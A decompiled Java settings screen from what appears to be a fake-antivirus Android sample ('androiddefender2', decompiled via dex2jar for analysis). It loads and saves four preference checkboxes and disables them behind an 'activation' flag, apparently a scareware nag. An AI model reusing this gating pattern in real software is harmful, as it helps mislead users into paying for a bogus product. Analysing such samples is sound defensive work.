package com.example.androiddefender2;

import android.content.SharedPreferences;
import android.graphics.Color;
import android.os.Bundle;
import android.view.Menu;
import android.view.View;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.ImageView;
import android.widget.TextView;
import system.AppSingleton;

public class SettingsActivity extends CustomActGroup {
  public static SettingsActivity self;
  
  public Button btnSaveSettings;
  
  public CheckBox chkAutostart;
  
  public CheckBox chkMessages;
  
  public CheckBox chkMinimizeWhenStart;
  
  public CheckBox chkStartWhenStart;
  
  public void btnBack_Click(View paramView) {
    onBackPressed();
  }
  
  public void loadAppSetings() {
    DefenderApplication.getInstance();
    SharedPreferences sharedPreferences = getSharedPreferences(DefenderApplication.APP_PREF, 0);
    this.chkAutostart.setChecked(sharedPreferences.getBoolean("chkAutostart", false));
    this.chkStartWhenStart.setChecked(sharedPreferences.getBoolean("chkStartWhenStart", false));
    this.chkMinimizeWhenStart.setChecked(sharedPreferences.getBoolean("chkMinimizeWhenStart", false));
    this.chkMessages.setChecked(sharedPreferences.getBoolean("chkMessages", false));
  }
  
  public void onCreate(Bundle paramBundle) {
    super.onCreate(paramBundle);
    setContentView(2130903049);
    ImageView imageView = (ImageView)findViewById(2131296319);
    TextView textView1 = (TextView)findViewById(2131296334);
    TextView textView2 = (TextView)findViewById(2131296335);
    this.chkAutostart = (CheckBox)findViewById(2131296337);
    this.chkStartWhenStart = (CheckBox)findViewById(2131296340);
    this.chkMinimizeWhenStart = (CheckBox)findViewById(2131296341);
    this.chkMessages = (CheckBox)findViewById(2131296339);
    this.btnSaveSettings = (Button)findViewById(2131296338);
    loadAppSetings();
    if (!(AppSingleton.getInstance()).activaten) {
      imageView.setImageResource(2130837580);
      textView1.setTextColor(Color.parseColor("#9b0000"));
      textView1.setText(2131099673);
      textView2.setVisibility(0);
      this.chkAutostart.setEnabled(false);
      this.chkStartWhenStart.setEnabled(false);
      this.chkMinimizeWhenStart.setEnabled(false);
      this.chkMessages.setEnabled(false);
      this.btnSaveSettings.setEnabled(false);
    } else {
      imageView.setImageResource(2130837556);
      textView1.setTextColor(Color.parseColor("#155d86"));
      textView1.setText(2131099720);
      textView2.setVisibility(4);
      this.btnSaveSettings.setOnClickListener(new View.OnClickListener() {
            public void onClick(View param1View) {
              SettingsActivity.this.saveAppSettings();
            }
          });
    } 
    self = this;
  }
  
  public boolean onCreateOptionsMenu(Menu paramMenu) {
    getMenuInflater().inflate(2131230727, paramMenu);
    return true;
  }
  
  public void saveAppSettings() {
    if ((AppSingleton.getInstance()).activaten) {
      DefenderApplication.getInstance();
      SharedPreferences.Editor editor = getSharedPreferences(DefenderApplication.APP_PREF, 0).edit();
      editor.putBoolean("chkAutostart", this.chkAutostart.isChecked());
      editor.putBoolean("chkStartWhenStart", this.chkStartWhenStart.isChecked());
      editor.putBoolean("chkMinimizeWhenStart", this.chkMinimizeWhenStart.isChecked());
      editor.putBoolean("chkMessages", this.chkMessages.isChecked());
      editor.commit();
    } 
  }
}


/* Location:              /home/fahim/Desktop/fake_av_reader-dex2jar.jar!/com/example/androiddefender2/SettingsActivity.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */